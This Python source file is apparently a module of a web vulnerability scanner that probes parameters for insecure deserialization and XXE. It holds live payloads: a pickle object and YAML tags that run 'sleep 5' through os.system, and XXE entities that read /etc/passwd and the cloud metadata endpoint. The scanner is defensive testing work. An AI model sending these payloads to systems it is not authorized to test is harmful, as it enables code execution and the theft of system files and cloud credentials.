"""Insecure Deserialization detection module."""
import httpx
from .async_base import AsyncBaseAttackModule


class InsecureDeserializationModule(AsyncBaseAttackModule):
    """Detects Insecure Deserialization vulnerabilities.
    
    Insecure deserialization occurs when untrusted data is used to abuse
    the logic of an application, inflict denial of service, or execute
    arbitrary code upon deserialization.
    """
    
    # Python pickle payloads (base64 encoded malicious objects)
    PICKLE_PAYLOADS = [
        # Payload that would execute 'sleep 5' if deserialized
        'gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhzbGVlcCA1lIWUUpQu',
        # Simpler test payload
        'gAN9cQBYBQAAAHRlc3RxAVgFAAAAdmFsdWVxAnMu',
    ]
    
    # Java serialization magic bytes
    JAVA_SERIAL_MAGIC = [
        'rO0AB',  # Base64 of AC ED 00 05
        'aced0005',  # Hex
    ]
    
    # .NET serialization patterns
    DOTNET_PATTERNS = [
        'AAEAAAD',  # .NET BinaryFormatter
        'TypeObject',
        'System.Object',
    ]
    
    # PHP serialization payloads
    PHP_PAYLOADS = [
        'O:8:"stdClass":1:{s:4:"test";s:5:"value";}',
        'O:4:"Test":1:{s:4:"name";s:5:"value";}',
        'a:1:{i:0;s:4:"test";}',
    ]
    
    # YAML deserialization payloads (Python-specific)
    YAML_PAYLOADS = [
        '!!python/object/apply:os.system ["sleep 5"]',
        '!!python/object/new:os.system ["sleep 5"]',
        '!!python/object/apply:subprocess.call [["sleep", "5"]]',
    ]
    
    # XML External Entity payloads
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ]
    
    def name(self) -> str:
        """Return module name."""
        return "insecure_deserialization"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects Insecure Deserialization vulnerabilities in JSON, XML, pickle, YAML"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if deserialization testing applies to this parameter.
        
        Args:
            parameter: Parameter dict with 'name', 'value', 'location'
            context: Context dict with 'url', 'method', 'all_params'
        
        Returns:
            bool: True if this module should test the parameter
        """
        param_name = parameter.get('name', '')
        if param_name is None:
            return False
        
        param_name_lower = param_name.lower()
        param_value = str(parameter.get('value', '')).lower()
        
        # Check parameter names that might contain serialized data
        serial_keywords = [
            'data', 'object', 'payload', 'serialized', 'session',
            'state', 'token', 'cookie', 'profile', 'user', 'pref',
            'preferences', 'settings', 'config'
        ]
        
        name_match = any(keyword in param_name_lower for keyword in serial_keywords)
        
        # Check if value looks like serialized data
        value_indicators = [
            'o:',  # PHP object
            'a:',  # PHP array
            'rO0',  # Java serialization
            'aced',  # Java hex
            '{"',  # JSON
            'AAEAAAD',  # .NET
            '<?xml',  # XML
            'gAS',  # Pickle base64
        ]
        
        value_match = any(indicator in param_value for indicator in value_indicators)
        
        return name_match or value_match
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Scan for insecure deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings
        """
        findings = []
        
        try:
            # Get baseline
            baseline_params = {parameter['name']: parameter['value']}
            baseline_response = await client.get(url, params=baseline_params, timeout=self.timeout)
            
            # Test different serialization formats
            findings.extend(await self._test_pickle(url, parameter, client, baseline_response))
            findings.extend(await self._test_php_serialization(url, parameter, client, baseline_response))
            findings.extend(await self._test_java_serialization(url, parameter, client, baseline_response))
            findings.extend(await self._test_yaml(url, parameter, client, baseline_response))
            findings.extend(await self._test_xxe(url, parameter, client, baseline_response))
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error in deserialization module: {e}")
        
        return findings
    
    async def _test_pickle(self, url: str, parameter: dict, client: httpx.AsyncClient, baseline_response) -> list:
        """Test for Python pickle deserialization.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
            baseline_response: Baseline response
        
        Returns:
            list: Findings
        """
        findings = []
        
        for payload in self.PICKLE_PAYLOADS[:2]:
            try:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout + 6)
                
                # Check for pickle-related errors
                error_indicators = [
                    'pickle',
                    'unpickle',
                    'cPickle',
                    '_pickle',
                    'marshal',
                    'Traceback',
                    'UnpicklingError',
                ]
                
                response_lower = response.text.lower()
                baseline_lower = baseline_response.text.lower()
                
                for indicator in error_indicators:
                    if indicator.lower() in response_lower and indicator.lower() not in baseline_lower:
                        findings.append({
                            'name': 'Insecure Deserialization - Python Pickle',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'Pickle deserialization error detected: "{indicator}"',
                            'recommendation': 'Never deserialize untrusted data with pickle. Use JSON for data exchange. If pickle is necessary, implement HMAC signing to verify data integrity.'
                        })
                        return findings
            
            except Exception as e:
                if 'timeout' in str(e).lower():
                    # Timeout might indicate successful code execution (sleep command)
                    findings.append({
                        'name': 'Possible Insecure Deserialization - Pickle RCE',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter['name'],
                        'payload': payload,
                        'evidence': 'Request timed out, possibly indicating code execution',
                        'recommendation': 'Immediately stop using pickle for untrusted data. This is a critical RCE vulnerability.'
                    })
                    return findings
                continue
        
        return findings
    
    async def _test_php_serialization(self, url: str, parameter: dict, client: httpx.AsyncClient, baseline_response) -> list:
        """Test for PHP serialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
            baseline_response: Baseline response
        
        Returns:
            list: Findings
        """
        findings = []
        
        for payload in self.PHP_PAYLOADS[:2]:
            try:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout)
                
                # Check for PHP unserialize errors
                error_indicators = [
                    'unserialize()',
                    'Notice: unserialize',
                    'Warning: unserialize',
                    '__wakeup',
                    '__destruct',
                    '__toString',
                ]
                
                response_lower = response.text.lower()
                baseline_lower = baseline_response.text.lower()
                
                for indicator in error_indicators:
                    if indicator.lower() in response_lower and indicator.lower() not in baseline_lower:
                        findings.append({
                            'name': 'Insecure Deserialization - PHP unserialize()',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'PHP deserialization detected: "{indicator}"',
                            'recommendation': 'Do not use unserialize() on user input. Use JSON for data exchange, or implement signature verification for serialized data.'
                        })
                        return findings
            
            except Exception:
                continue
        
        return findings
    
    async def _test_java_serialization(self, url: str, parameter: dict, client: httpx.AsyncClient, baseline_response) -> list:
        """Test for Java serialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
            baseline_response: Baseline response
        
        Returns:
            list: Findings
        """
        findings = []
        
        for payload in self.JAVA_SERIAL_MAGIC[:1]:
            try:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout)
                
                # Check for Java deserialization errors
                error_indicators = [
                    'java.io.ObjectInputStream',
                    'ClassNotFoundException',
                    'InvalidClassException',
                    'StreamCorruptedException',
                    'SerializationException',
                ]
                
                response_text = response.text
                baseline_text = baseline_response.text
                
                for indicator in error_indicators:
                    if indicator in response_text and indicator not in baseline_text:
                        findings.append({
                            'name': 'Insecure Deserialization - Java',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'Java deserialization detected: "{indicator}"',
                            'recommendation': 'Avoid deserializing untrusted data. Use look-ahead ObjectInputStream, implement allowlists, or use safer alternatives like JSON.'
                        })
                        return findings
            
            except Exception:
                continue
        
        return findings
    
    async def _test_yaml(self, url: str, parameter: dict, client: httpx.AsyncClient, baseline_response) -> list:
        """Test for YAML deserialization vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
            baseline_response: Baseline response
        
        Returns:
            list: Findings
        """
        findings = []
        
        for payload in self.YAML_PAYLOADS[:1]:
            try:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout + 6)
                
                # Check for YAML errors
                error_indicators = [
                    'yaml.constructor',
                    'YAMLError',
                    'ConstructorError',
                    'yaml.load',
                ]
                
                response_lower = response.text.lower()
                baseline_lower = baseline_response.text.lower()
                
                for indicator in error_indicators:
                    if indicator.lower() in response_lower and indicator.lower() not in baseline_lower:
                        findings.append({
                            'name': 'Insecure Deserialization - YAML',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'YAML deserialization detected: "{indicator}"',
                            'recommendation': 'Use yaml.safe_load() instead of yaml.load(). Never deserialize untrusted YAML with full loading capabilities.'
                        })
                        return findings
            
            except Exception as e:
                if 'timeout' in str(e).lower():
                    findings.append({
                        'name': 'Possible Insecure Deserialization - YAML RCE',
                        'severity': 'Critical',
                        'url': url,
                        'parameter': parameter['name'],
                        'payload': payload,
                        'evidence': 'Request timed out during YAML test',
                        'recommendation': 'Use yaml.safe_load() only. This may be a critical RCE vulnerability.'
                    })
                    return findings
                continue
        
        return findings
    
    async def _test_xxe(self, url: str, parameter: dict, client: httpx.AsyncClient, baseline_response) -> list:
        """Test for XML External Entity vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
            baseline_response: Baseline response
        
        Returns:
            list: Findings
        """
        findings = []
        
        for payload in self.XXE_PAYLOADS[:1]:
            try:
                test_params = {parameter['name']: payload}
                response = await client.get(url, params=test_params, timeout=self.timeout)
                
                # Check for XXE indicators (file contents or metadata)
                xxe_indicators = [
                    'root:x:0:0:',
                    'ami-',
                    'instance-id',
                ]
                
                response_text = response.text
                baseline_text = baseline_response.text
                
                for indicator in xxe_indicators:
                    if indicator in response_text and indicator not in baseline_text:
                        findings.append({
                            'name': 'XML External Entity (XXE) Injection',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': f'External entity content detected: "{indicator}"',
                            'recommendation': 'Disable XML external entity processing. Use defusedxml library or configure XML parser to disallow DOCTYPE declarations.'
                        })
                        return findings
            
            except Exception:
                continue
        
        return findings
